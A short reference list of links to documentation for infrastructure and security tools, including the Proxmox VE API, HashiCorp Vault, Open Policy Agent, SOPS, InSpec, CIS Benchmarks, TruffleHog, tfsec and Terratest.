- Proxmox VE API Documentation: https://pve.proxmox.com/pve-docs/api-viewer/
- Proxmox VE Administration Guide -- User Management: https://pve.proxmox.com/pve-docs/chapter-pveum.html
- HashiCorp Vault Documentation: https://developer.hashicorp.com/vault/docs
- Open Policy Agent / Rego: https://www.openpolicyagent.org/docs/latest/
- Conftest: https://www.conftest.dev/
- Ansible community.general Collection: https://docs.ansible.com/ansible/latest/collections/community/general/
- Mozilla SOPS: https://github.com/getsops/sops
- InSpec: https://docs.chef.io/inspec/
- CIS Benchmarks: https://www.cisecurity.org/cis-benchmarks
- TruffleHog: https://github.com/trufflesecurity/trufflehog
- tfsec: https://aquasecurity.github.io/tfsec/
- Terratest: https://terratest.gruntwork.io/
